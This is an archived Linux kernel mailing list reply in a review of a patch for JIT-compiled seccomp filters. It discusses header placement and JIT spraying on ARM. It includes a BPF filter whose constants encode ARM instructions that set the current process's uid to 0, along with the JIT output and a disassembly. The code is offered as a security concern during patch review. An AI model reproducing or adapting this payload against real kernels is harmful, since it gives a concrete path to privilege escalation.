Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S932308Ab3COTxe (ORCPT <rfc822;w@1wt.eu>);
	Fri, 15 Mar 2013 15:53:34 -0400
Received: from ns.iliad.fr ([212.27.33.1]:39258 "EHLO ns.iliad.fr"
	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
	id S932272Ab3COTxL (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Fri, 15 Mar 2013 15:53:11 -0400
Message-ID: <51437C25.4030004@freebox.fr>
Date: Fri, 15 Mar 2013 20:53:09 +0100
From: Nicolas Schichan <nschichan@freebox.fr>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20130106 Thunderbird/17.0.2
MIME-Version: 1.0
To: Kees Cook <keescook@chromium.org>
CC: Will Drewry <wad@chromium.org>, Mircea Gherzan <mgherzan@gmail.com>,
        Al Viro <viro@zeniv.linux.org.uk>,
        Andrew Morton <akpm@linux-foundation.org>,
        Eric Paris <eparis@redhat.com>,
        James Morris <james.l.morris@oracle.com>,
        Serge Hallyn <serge.hallyn@canonical.com>,
        LKML <linux-kernel@vger.kernel.org>
Subject: Re: [PATCH RFC 1/3] seccomp: add generic code for jitted seccomp
 filters.
References: <1363372123-8861-1-git-send-email-nschichan@freebox.fr> <1363372123-8861-2-git-send-email-nschichan@freebox.fr> <CAGXu5jLMPFoeAD5uXaMf-CS9yz_8_1zRJEkzxT7R6U4HruJSjQ@mail.gmail.com> <51437232.8000509@freebox.fr> <CAGXu5jJAbk_gZXkfftjD7U9dOmGSSW-PSqJ4JdV0frMnS6iwRQ@mail.gmail.com>
In-Reply-To: <CAGXu5jJAbk_gZXkfftjD7U9dOmGSSW-PSqJ4JdV0frMnS6iwRQ@mail.gmail.com>
Content-Type: text/plain; charset=ISO-8859-1; format=flowed
Content-Transfer-Encoding: 7bit
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

On 03/15/2013 08:22 PM, Kees Cook wrote:
> On Fri, Mar 15, 2013 at 12:10 PM, Nicolas Schichan <nschichan@freebox.fr> wrote:
>> On 03/15/2013 07:45 PM, Kees Cook wrote:
>>>
>> Yes, I did not realise that this header was exported to userspace. Do you
>> know any place not exported to userspace where the structure definition
>> would be appropriate ?
>
> Nothing really jumps to mind. :( We should probably do the uapi split,
> so that this can stay here, but the public stuff is in the other file.
> I'm not actually sure what's needed to do that split, though.

Would putting the structure definition in a <linux/seccomp_priv.h> file be 
acceptable ? Or is there some preprocessor macro that could prevent part of an 
include file ending up in uapi (similar to __KERNEL__ or __ASSEMBLY__).

>> Regarding JIT spraying, I believe ARM is actually worse than x86 in that
>> regard, since the values appearing in the literal pool can be quite easily
>> controlled by an attacker.
>
> Yeah, same for x86, really. Masking these would be nice, but is
> probably a separate discussion.

I meant that ARM makes it even easier in that you don't even have to 
interleave the evil immediate between instruction. The instruction sequence 
will appear verbatim in the litteral pool.

For instance the following BPF code:

struct sock_filter code[] = {
	{ BPF_LD, 0, 0, 0xe3a01a02 },
	{ BPF_LD, 0, 0, 0xe2411001 },
	{ BPF_LD, 0, 0, 0xe00d1001 },
	{ BPF_LD, 0, 0, 0xe59111a0 },
	{ BPF_LD, 0, 0, 0xe3a02000 },
	{ BPF_LD, 0, 0, 0xe5812004 },
	{ BPF_LD, 0, 0, 0xe1a0f00e },
	{ BPF_RET, 0, 0, 0 },
};

Produces this ARM code:

BPF JIT code: bf000000: e92d0010 e3a04000 e59f4020 e59f4020
BPF JIT code: bf000010: e59f4020 e59f4020 e59f4020 e59f4020
BPF JIT code: bf000020: e59f4020 e3a00000 e8bd0010 e12fff1e
BPF JIT code: bf000030: e3a01a02 e2411001 e00d1001 e59111a0
BPF JIT code: bf000040: e3a02000 e5812004 e1a0f00e

Parts of which disassembles to (only eye-tested):

	mov	r1, #8192
	sub	r1, r1, #1	 @ r1 = THREAD_SIZE - 1
	and	r1, sp, r1	 @ get current.
	ldr	r1, [r1, #416]	 @ get current->real_cred
	mov	r2, #0
	str	r2, [r1, #4]	 @ store 0 in current->real_cread->uid.
	mov	pc, lr

Userland can insert code to change the uid of the current process quite easily 
in an executable page. The only remaining task is to trick the kernel into 
executing it :)

Regards,

-- 
Nicolas Schichan
Freebox SAS
